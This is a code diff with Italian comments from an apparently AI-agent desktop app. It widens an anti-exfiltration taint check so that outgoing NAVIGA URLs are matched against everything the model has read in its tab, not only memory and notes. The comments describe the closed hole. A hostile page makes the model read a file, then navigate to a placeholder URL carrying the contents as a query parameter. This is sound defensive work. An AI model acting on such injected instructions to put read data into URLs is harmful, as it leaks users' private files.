@@ -1043,12 +1043,23 @@ function displayCwd(cwd) {
   return p;
 }
 
-// Corpus sensibile per il taint-match di NAVIGA (anti-esfiltrazione): SOLO i
-// dati personali persistenti che il modello aveva nel contesto — memoria
-// (profilo/preferenze/espansioni) e appunti. NON lo stato delle schede né le
-// loro URL: un legittimo "riapri la scheda X" porterebbe quell'URL nel link e
-// matcherebbe lo stato → falso positivo. Quelli non sono segreti da proteggere.
-async function navExfilCorpus() {
+// Corpus sensibile per il taint-match di NAVIGA (anti-esfiltrazione): i dati
+// personali persistenti che il modello aveva nel contesto — memoria
+// (profilo/preferenze/espansioni) e appunti — PIÙ tutto ciò che il modello ha
+// letto in questa scheda: output dei comandi, documenti aperti dal disco, file
+// dell'editor, risultati di ricerca (src/main/services/contextTaint.js).
+//
+// Quest'ultima parte mancava, ed era il buco di #587: `cat bolletta.txt` seguito
+// da `NAVIGA https://sito/?d=<contenuto>` non trovava niente nel corpus, quindi
+// NAVIGA restava livello 1 e l'indirizzo partiva senza chiedere nulla. Ciò che
+// il modello ha appena letto è esattamente ciò che una pagina ostile gli
+// chiederà di riscrivere in un URL.
+//
+// NON entra lo stato delle schede né le loro URL: un legittimo "riapri la scheda
+// X" porterebbe quell'URL nel link e matcherebbe lo stato → falso positivo.
+// Quelli non sono segreti da proteggere.
+async function navExfilCorpus(sender) {
+  const pezzi = [];
   try {
     const mem = await FiloMem.getMemory();
     const { profilo, preferenze, espansioni } = FiloMem.renderMemoryForPrompt(mem);
@@ -1057,8 +1068,10 @@ async function navExfilCorpus() {
     // dal vecchio archivio `filo_notes`, che dopo la migrazione resta vuoto.
     let notes = '';
     try { const EF = require('./editorFiles'); notes = await EF.notesCorpusText(); } catch (_) {}
-    return [profilo, preferenze, espansioni, notes].filter(Boolean).join('\n');
-  } catch (_) { return ''; }
+    pezzi.push(profilo, preferenze, espansioni, notes);
+  } catch (_) {}
+  try { pezzi.push(require('./contextTaint').corpusText(sender)); } catch (_) {}
+  return pezzi.filter(Boolean).join('\n');
 }
 
 // ── Difesa in profondità sulle azioni confermate (#250) ─────────────────────
